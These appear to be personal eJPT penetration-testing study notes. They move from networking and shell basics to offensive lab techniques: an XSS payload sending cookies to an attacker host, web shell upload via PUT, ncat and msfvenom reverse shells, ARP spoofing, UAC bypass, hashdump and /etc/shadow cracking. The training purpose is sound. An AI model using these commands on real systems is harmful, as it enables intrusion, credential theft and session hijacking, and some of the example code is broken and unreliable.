Packet Structure:-
Header-Contain addresses
Payload-Actual information

IPv4-4 octets
Reserved ipv4 addresses:-
0.0.0.0-0.255.255.255 - Starting and ending addresses of network
127.0.0.0-127.255.255.255-IP addresses depicting localhost(your system)
192.168.0.0-192.168.255.255-Private IP's

Router-Devices to forwarding packet, frames (depending on layer used)from one node to another
Routing-Collection of networks
Routing protocols are used for the same
Routing protocols check for the shortest path between source and destination, for travel

Inspection of destination addresses is done by the router,then sends the packet to appropriate network

Routing Table-Contains information of destination, interface, etc.
Default entry in Routing Table-0.0.0.0 - For a packet, whose destination is an unknown network

Default interface in routing table-Say an interface is receiving a packet, for a specific address. The router table has configured a default interface. So if no addresses in the table match with the destination address of the packet, the default interface receives the packet

arp -a 

Data Link layer

Data is known as frames
Hubs and switches forward them
They use MAC Addresses for reference


netcat doesn't support HTTPS Connections

Web Applications:-

HTTP works over TCP and is stateless

User Agent-Browser being used to perform connection request

What do youCleartext protocol-HTTP
Not usable on website transmitting sensitive information

WireShark-For packet sniffing

We can start packet capture, examine packets, etc.

Scenario 1 Log on to a website following HTTP protocol
We are logging in, using our credentials, which is sensitive info

Packets are programmed to capture packets, before the logging process.

When we view the packets, after performing a login attempt, we can view the credential information, by examining the packet

Right click on packet ->Follow->Tcp stream 
For an HTTP protocol website,(Packet is green)-the data will be visible in cleartext
For HTTPS,(Black packet)-it will be in an incomprehensible form, as it is encrypted

 have in a request packet

- Type of request,with protocol version - GET,POST etc  / HTTP/1.1
- Host - Hostname being requested
- Accept - Type of document being expected (txt,html forms)
- Accept Language - Human Language (/en_en/)
- Acccept Encoding - Two typesof compression - gzip and deflate
- Connection = Either keep_alive (sustain) or die

Performing packet analysis for HTTP - Netcat and Burpsuite(Repeater tool)


For netcat - Command - netcat -v <domain name >  <port> -Here 80

HTTPS Packet Analysis -We use OpenSSL

Command - openssl s_client -connect <domain name>:443


Cookies

-Stored in the cookie jar of  a website -Different for different websites

Format:-

Cookie Content
Expiration Date - Cookie can only be used up to this date
Path
Domain 
Flag-setting attributes -Examples - HttpOnly ,Secure etc

If set a path ->The cookie also applies to /mainpath/subpath1/subpath2/and so on


Session - storing a record between C-S communication
- Has a session and token id
- This session data is stored on the server-side
-When you close a website login, the cookie for that website will be deleted immediately

Same Origin Policy -Simply states that JavaScript used on a website, cannot be used from a different origin -Or else causes client information stealing


Burpsuite

Spider-Crawl over the website.Especially if you don't know the website's layout or architecture

To backdoor a Linux Account, you need the following files:-
~/.bashrc
~/.bash_profile   -Allow to set the environment properly
~/.bash_logout

Environment variables 
Command- env

Some variables:-
PATH - echo $PATH- To find the path for executable files

Command - burp suite
PATH variable will look around the system, for executable files of the 'burpsuite' command. Eventually, it finds it in the /usr/bin path and will load the executable file for us

If I type in - burp suite - PATH variable will return "brpsuite: Command not found"

TO find a command's location - 'which command

To find chmod's location - which chmod -
Returns the location

Bash symbols:-

* - used in rm file*
| (pipe) - Chain two or more commands
>> - Move output to a file 


.sh - Executable bash file
Always start a bash script using #!/bin/bash

Bash conditional statements

if <condition>;then  <-If statement
<comands>
fi

Else and Elif commands

if (condition);then
<command>

elif (command);then
<next command>

else
<another command>
fi

Arithmetic conditional operators:-

-eq - Equal
-ne  Not equal
-lt -Less than
-le -Less than or equal to
-gt- Greater than
-ge-Greater than or equal to

Declaring variables:-

x=<number>
y="<string>"  <-Same as python

Simple bash program to check if two numbers are equal

#!/bin/bash

x=3
y=4

if ["$a" -eq "$b"];then
echo "They are equal";
fi

Bash conditional statements

i)For loop  -Program to loop and print all items in a directory

#!/bin/bash
for i in $(ls);do
echo item;$i
done

Looping over numbers

#!/bin/bash
for i in `seq 1 10`;
do
echo $i
done

While loop - One liner commands

Eg)while read line;do echo $line; done < file.txt

Windows Command line:-

Commands- del,move,dir etc
In Windows, directories point towards \
In Linux, directories point towards /

Accessing Windows variables:-

echo %PATH% - Provides path of executables
echo %us
ername%- Provides username of the current user
-You can create variables of your own. These stay temporarily, in the current cmd window

Output generation echo <command> >> <filename>
type <filename> - View contents of a file

Command chaining:-
command 1 & command2 - Execute 100%,without regard of result
command 1 && command 2 - If executed 1'st,execute second.Else fail

command 1 | command2 - Execute 100%,without regard of result
command 1 || command 2 - If executed 1'st,execute second.Else fail

Conditional statements

-Example using setting up an environmental variable

set a variable - set y=2

if %y%==2 (echo false) ->returns false
if %y%==2 (echo false) ->returns true

if %y%==4 (echo false) ->Doesnt return anything
if %y%==4 (echo true) ->Doesnt return anything

Penetration Testing Basics

Information given out by employees - emails, phone numbers, and plans - Helps an attacker to build the technical mapping of an organization

LinkedIn - Has advanced search features - narrow professional profiles down

If you are targetting an ad agency, your target - Instagram

Other methods of OSINT:-
whois lookup
crunch database
Target organization's website
Government websites
Hunting down employee emails (following a specific pattern)
firstname.surname@organization.com - Using G+ Suite
firstletter.surname@organization.com

These are called schemas
-Helping out hackers-Address doesn't exist -after sending an email
-Narrow down your schema formats
-Mail them with something catchy, that makes them open the mail

Subdomain Enumeration tools:-
-Sublist3r
-dnsdumpster - Google tool
Google Dorks
crt.sh
-Amass

REMEMBER: WHY DO WE DO THIS? -An attacker always wants to broaden the attack surface. Enumerate as much as possible

Mapping a network
-You won't always get a fixed target address
-Sometimes a block of 65536 addresses. How do find which machine is assigned to which IP?

MAP A NETWORK - YOU DON'T KNOW WHAT IP HOSTS ARE PRESENT

How does a mapper know whether a port or a host is up/open?-By performing a ping across it

Tools:-

Use fping
-fping  Command- fping -a -g <IP Range> Eg-10.10.10.10 (single)
                      or
                                            10.10.10.0/24 (range)

Use Nmap
Command  -  nmap -sN <subnet> 10.10.10.0/24

Switches - -a = show alive hosts
-g - Ping sweep, instead of a standard ping test

-Nmap scan, with a -sN switch (ping scan) - for both single and range

OS Fingerprinting
-Nmap, using -O switch (OS Detection)

Nmap port scanning
-sT - 3-way handshake - SYN   SYN+ACK   ACK
-sS  -Stealthy scan - Only sends SYN Packet
Target machine returns:-
RST - For closed ports
ACK - For open ports
-Pn - Ping ports 
-sU - UDP Scan
-sV - Service version scan


Larger Network surface of target - more likely to have a firewall in place

Firewalls in place:-
Not able to determine open or close ports
No clarity in-service version detection of a target (machine type), same goes for a port (service version of service existing on a port)

-Masscan - Faster than Nmap, but less accurate

-Know the need of your customer -Might ask for a full pentest or a simple vulnerability assessment over their network(Just use a vulnerability scanner, or tools with --vuln find switches)
-Examples - Nessus, OpenVAS, Nexpose, and GFI LAN Gaurd

Custom Application Testing - Not some official regular software
-You have to manually test it.
-Understand its functionality, reverse engineer it's working, etc


Steps of a Nessus scan:-
-Port Scan
-Service Detection on ports
-Vulnerability check, on ports, with lookups on vulnerability databases, for verification
-Probe - To remove false positives 

Website Enumeration - For eJPT 
whois <domain>
or
whois <IP>

Web Server Fingerprinting

Banner Grabbing and manually powered tools - httprint and netcat

Netcat example - You want to find the server and its version 

Command-nc <IP/Domain Name> 80
Then enter - HEAD / HTTP/1.0 ->Press 'enter' button two times


httprint example             (I Prefer httprint.Use this)
Command - httprint -P0 -h <IP> -s /usrshare/httprint/signatures.txt

Switch meaning - P0 -Avoid pinging the web host
-s -Use signature file from httprint
or

curl -i -X -h http://<IP> - It works
Banner Grabbing for Https web servers (It works)
Tool - OpenSSL
Command-openssl s_client -connect <domain name>:443
Then type HEAD / HTTP/1.0

CHECK WHICH HTTP VERBS ARE AVAILABLE ON THE SERVER -using netcat
------------------------------------------------------------------
I use cURL
Command - curl -i -X OPTIONS http://<IP>

Shows the allowed options like Allow:

You can also use nikto 
Command - nikto -h HTTP://<IP>
--------------------------------------------------------------------
nc 10.10.10.10 80
OPTIONS / HTTP/1.0
--------------------------------------------------------------------
GET - Get resource (I use cURL)

Command - curl -i -X GET http://<IP>/path/to.txt/or/.php/page
--------------------------------------------------------------------
GET /<page>.php / HTTP/1.1    page.php(singular webpage) and not the
domain name
--------------------------------------------------------------------
I prefer using curl
Command - curl -i -X GET http://<IP>/path/filetoget
-------------------------------------------------------------------
Host: <domain name>.com

You can also pass arguments to the GET verb
Example -  Pass argument course=Pentest to INE
Command - GET <INE.com>?course=Pentest HTTP/1.1
Host: www.INE.com

POST - Submit some input data into a web form

POST <page>.php / HTTP/1.1
Host:<domain>com

log=admin&pass=admin

HEAD-Only receive page header and no body content

HEAD <page>.php  / HTTP/1.1
Host:<domain>.com

PUT - Upload a file, onto a server - similar to FTP command
-------------------------------------------------------------------
I prefer using curl
Commmand - curl -i -X PUT http://<IP>/path/filetoupload
--------------------------------------------------------------------
PUT /wp-uploads.php/ / HTTP/1.1
Host: <domain>.com

<PUT file_to_insert>

DELETE - To delete resources from the webserver

DELETE /page.php / HTTP/1.1
Host:<domain>.php

OPTIONS - Query the webserver for enabled HTTP verbs on the server. Find what verbs are permissible to use on the server

OPTIONS / HTTP/1.1
Host:<domain>.php 

REST API - Representational State Transfer Application Programming Interface - These API's can "PUT" files on the server


Enumerating options on a web server
-You can use cURL
-You can use netcat too - Command - nc <domain>.com 80
then type -  OPTIONS / HTTP/1.1 -Returns the verbs/options you can do to the server

Exploiting PUT
Why? - To upload shells on the server

Constraints - Size of payload - 
Command to find size - wc -m <payload/shell>.php
Then enter x <payloadname>.php

Then put the shell onto the server
PUT /path / HTTP/1.1                     nc <domain>.com 80
Host:<domain>.php              or

PUT /<file>                               PUT /<shell>.php HTTP/1.0

After uploading shell - Go to path of the uploaded shell
?cmd= <your command>


Google Hacking


site: Only belonging to a particular company
intitle: Look for specific words on the website title
inurl: Specific words in the URL address of the website
filetype: Hunt down .pdf,.xlsx, type files
AND, OR - 
-(symbol)  - To filter some keywords

XSS
-Steal session data
-Inject malicious code to person browsing site
-Attacker can control compromised web servers and sessions of users
-Points for vulnerability and malicious code injection-GET Parameters, cookies, POST parameters, and all use input parameters

Types:-

Reflected - Malicious Code is injected on the URL of the website. When clicked and redirected, XSS Attack takes place

Persistent - Code is sent to the vulnerable web server and then stored by the server. When asked to load the page, the payload will perform the XSS on the visitor

-Persistent = Present all the time, when a particular injected page is loaded

How to get cookies - use <script>alert(document.cookie)</script>
-In a comment field ,search field or post field - Only returns your cookies

Otheer methods of XSS:-
Reflective - <script><h2>Hi</h2></script> -Enter this in a comment field or search fields- If the comment is not sanitized, you will get a big HI comment

Another method - <script>alert("XSS!")</script> -Again on user comment area or search field

Another method - \<script> alert(\'XSS\') \</script> - In search bar
---------------------------------------------------------------------
To print your Session Cookie-ID - Infecting Feedback form

We have 2 methods:-

1)Infect Feedback form
For this task, we require a specific webpage, within the website, to store the cookies. Fortunately, INE has just done that, giving us
192.168.99.11/get.php

We also have a jar.txt file at the same IP, to store cookie id's

First, let's infect the Feedback form with the cookie stealing script

As in - Image X6

Now, we wait on http://192.168.99.11/jar.txt and get - Image X6 (1)
---------------------------------------------------------------------
2)Infect the comment field on the blog page

Enter comment - Nice Post <script> var i =New Image(): i.src="http://attackersite/get.php?cookie="+(document.cookie)"</script>

Click on POST and wait at the jar.txt page
We get the cookie ID
---------------------------------------------------------------------
Now, we need to change the current cookie id and set it to the captured admin's one.

Open Firebug - Go to cookies tab -Image X7
On the id field under Value, let's right-click and click on paste
It will open up - Image X7 (1)

Copy, paste and click Ok
We are now authenticated as Admin
---------------------------------------------------------------------

For stealing other users cookies, we cannot show the alert box to alert that a person's cookie id has been stolen

Stolen cookie ID will be stored back in a .jar file, hosted somewhere else, which is used by an attacker to log in as another user

Insert the grabbed cookie into firebug(in insert cookie field) and reload the page, to log in as someone else.
---------------------------------------------------------------------
XSS - General steps to find and test
1)Find reflection point
2)Test, with a tag
3)Test with HTML/Javascript code - (alert('XSS'))
---------------------------------------------------------------------

Two SQL Injection tests
id <-If it is a parameter /or test using other available parameters

?id=1' or 1=1; -- -              OR operator (if injection exists and the parameter is vulnerable, at least one of the injection commands will be executed, giving us a SQL Error message (IF AND ONLY IF THE PARAMETER IS VULNERABLE)) 

?id=1' or 1=2; -- - -Gives a normal page back,because 1==2 condition is false and confirms SQL Injection is triggered,when conditions are neccesarily true)

Try the tests on sqlmap and search bar


SQL Testing technique -  --technique=(Union)
Enumerate users -  -users

Other important switches -  -D - database
-T - Tables  -C -Columns you want to view
(when not using --dump-all switch)


-Burp intercept proxy for login ->send the packet to Intruder, try meddling with the user and password parameters, using '

Like  user=a'  (Turn off proxy, then forward the packet, to view if you get SQL Error or not) 
Then try                   user=a' or 1=1; -- -

Try for admin then try for password - Total 4 tries, to experiment, meddle and forward, to view response tab

Malware:-

Backdoor software used by pentesters-NetBus and SubSeven - use the backdoor to gain access and view data on the remote machine

Types:-
Trojan Horse
Bootkit - Trap your Boot up sequence and make changes to it
Greyware - Spyware + Adware +combination of both
Spyware
Adware
Keylogger
Ransomware
Rootkits - hide behind system processes, doesn't do noticeable work

For experiments, we can use ncat
-Download ncat on the target machine ->Rename installation file like to 'winconfig'

-Go to the folder, where the winconfig.exe(i.e ncat is located)
- Run it - winconfig -l -p 5555 -e cmd.exe

From attacker's machine -  Run - ncat <Victim IP> 5555


If you want to listen from attacker machine:-

On target machine - winconfig -e cmd.exe <Attacker IP> 5555

On Attacker machine - Run - nc-lvp 5555

Backdoors are possible to set up on Metasploit,using
exploit /multi/handler and setting payload to /windows/meterpreter/reverse_tcp

IMPORTANT: METASPLOIT 'S METERPRETER PROMPT ALLOWS YOU TO DOWNLOAD FILES

Perform - cd /directory  - traverse to the directory you want
MAKE SURE YOU ARE IN THE DIRECTORY FROM WHICH YOU WANT TO DOWNLOAD THE FILE

Command for download - download <file name> /root/ <-Download path to your machine

Also to upload files - Meterpreter> upload <filename>

Hashcat command syntax
hashcat -m <check what type of hash it is> -a <type mode> Hash file 

or

hashcat -m <check what type of hash it is> -a <type mode> Hash file /wordlist/file


Password Attacks 
1)unshadow

unshadow /etc/passwd shadow > unshadow

2)JohnTheRipper

Command - john -wordlist=/path/to/wordlist -users=users.txt hashfile

users.txt - Stores usernames
hashfile - Stores password  hashes found in /etc/passwd or /etc/shadow





------------------------------------------------------------------
Null Shares-Exploitable element of Windows (Either on the host you are pentesting or find on Legacy systems)

-Once properly exploited, you get info about system users, groups,passwords, and running processes

NETBIOS-SSN Enumeration tool on Windows
Command to find and enumerate a Windows machine - nbtstat -A <IP>(RUN ON WINDOWS MACHINE, AFTER GAINING ACCESS TO IT)

Now to enumerate the shares,

smbclient -L //<IP> -U ""

smbclient //<IP>/Share Name

Command - NET VIEW <IP>

NETBIOS-SSN Enumeration tool on Linux
-smbclient
-enum4linux
-nmblookup -     nmblookup -A <IP>

How to check for null sessions? - We target the IPC$ share, with empty credential fields (ON WINDOWS MACHINE)

Command - net use \\<IP>\IPC$ '' /u:'' (ON WINDOWS MACHINE)
If vulnerable, we gain access and the command was executed successfully

Checking the same,ON A LINUX MACHINE ,using SMBCLIENT
Command - smbclient //<IP>/IPC$ -N

Check the same, for C$ share

-Another tool to exploit Null sessions - winfo -download from packetstorm

Syntax - winfo <IP> -n

-Another tool - samrdump.py from /impacket
Syntax - python3 samrdump.py <IP>

More learning lessons - use --script=smb-brute and smb*

ARP Poisoning - Intercept and manipulate network traffic

ARP-Maps IP to MAC Address
- When sending packets, a computer makes use of both addresses
- Once MAC address resolution is complete, the destination address is stored in the ARP Cache table

Performing ARP Spoofing on Linux

-We use Dsniff tool for this.
Before running dsniff, we need to enable the Linux Kernel IP Forwarding - to enable Linux box into a router
Why? To tell your machine,to forward the intercepted packets, to the destination/target machine 

Commands:-  

First, open up your Wireshark and set it ip.addr == <to victim machine's IP Address>

echo 1 > /proc/sys/net/ipv4/ip_forward   - To turn packet forwarding on

arpspoof -i tap0 -t <Attacker IP> -r <Target IP>
View the intercepted packets and traffic on Wireshark


-MITM Attack possibility - ARP Cache tables of two hosts performing communication are infiltrated,then the attacker can sniff and monitor communication
-This attack is performed using gratious ARP replies
-Gratious ARP replies - Attacker sends reply, without waiting for the recipient to perform a request

Modus Operandi:-
- ARP message is sent by the attacker to all hosts on a network(that a particular host/IP can be reached, by using the MAC address available at the attacker's machine)

-As soon as the ARP cache table contains false information, every communication between poisoned nodes will be sent to the attacker's machine

-Attacker can prevent the poisoned entry from the ARP table from expiring, by sending a gratious ARP reply every 30s

-Once the attacker receives the communication packets, it needs to forward them to the correct destination

ARP Spoofing tool-DSniff Arpspoof(Setup and working is explained)

To perform an ARP Spoofing attack, you need
Wireshark and ARPSpoof tool

Start Wireshark, keep running in backgrounf
First step - Enable forwarding of IP packets to target
Command- echo 1 > /[roc/sys/net/ipv4/ip_forward

Next,perform a spoofing attack
Command- arpspoof -i eth0 -t <Source/Attacker IP> -r <Target IP>


eth0-running both machines on an ethernet interface
Then, run/do some operations on the target, on a login page, or accessing network shares

Wireshark captures traffic on the background 

If you have generated HTTP traffic, then filter Wireshark traffic by 'HTTP
Click on the Export option on Wireshark. You will see the uploads/downloads done on the HTTP Server
-Click on 'save as'.Go to your terminal and you will be able to access the file uploaded/downloaded from the target machine, on your machine

Very important - show payloads - when inside an exploit

Meterpreter:=

getsystem command - Usable on Windows-based machines, to escalate privileges. ONLY WHEN ROOTING WINDOWS BOXES

Command - meterpreter>   getsystem - Privilege escalate

If it doesn't work? Why? -Because User Account Control Policy prevents privilege escalation
ERROR MESSAGE YOU GET priv_elevate_getsystem: Operation failed: The environment is incorrect.

Now check if the current user has UAC enabled. From the meterpreter prompt, run

Command - run post/windows/gather/win_privs 

IF UAC enabled = true, you need to bypass it

How to bypass?
use exploit/windows/local/bypassuac 

(Remember to have a session already open, after successfully running the exploit, on the vulnerable component, using Metasploit's exploits. MAKE SURE YOU HAVE THE METERPRETER> PROMPT)
.How do you do that? - Command - background - Sets session 1 aside and helps you start a new one.

-Show options

Set the session ID of that session and exploit - Allows you to bypass User Account Control

Then perform the 'getsystem' command on the meterpreter prompt

Dumping password database -utility of meterpreter shell
ONLY USABLE WHILE ROOTING WINDOWS MACHINES

- Create a session(for the vulnerability, on Metasploit). Set options, exploit it, and make sure you get the meterpreter> prompt

-Command = background - Sets this session on the background and helps start a new one

use post/windows/gather/hashdump
-Show options
- set the session id of the session you just set to the background
-exploit


Other commands:-

background - Background the current session
sessions -l
sessions -i <number>
sysinfo
ifconfig
route
getuid
download files 
upload files
shell

cURL -utility to download files, from a web shell, which is vulnerable and responsive

Usage - Either after ? or enter into the whitespace offered by a web shell

Command - curl http://<IP>:<port> /path/of/file/to/download -T  /path/to/store/in

MAKE SURE TO HAVE YOUR NETCAT LISTENER READY ON THE PORT

Creating a payload, using  msfvenom - for listener
Command-msfvenom -p linux/x64/shell_reverse_tcp lhost=  lport= -f elf -o <name of file you want to save as>



Upload and save it on the target's machine

First, start the SimpleHTTPServer on port 80
On the browser- Command-curl http://<YourIP>:80/shellfile -o /directory/on/target/to/save/on
Change permissions, to make it executable

Command = chmod 700 /directory/of/target/where/thefile/is/saved

Now set your netcat to listener mode - nc -lvp 4444

Now go to the browser and just type the directory/path/of/uploaded/script file

Why? - We already set the IP and port to listen on, in the msf payload. So just set your netcat to listen on the same port, while
entering the uploaded shell path on the web shell

Two ways to upgrade your shell

bash -i or python one=liner
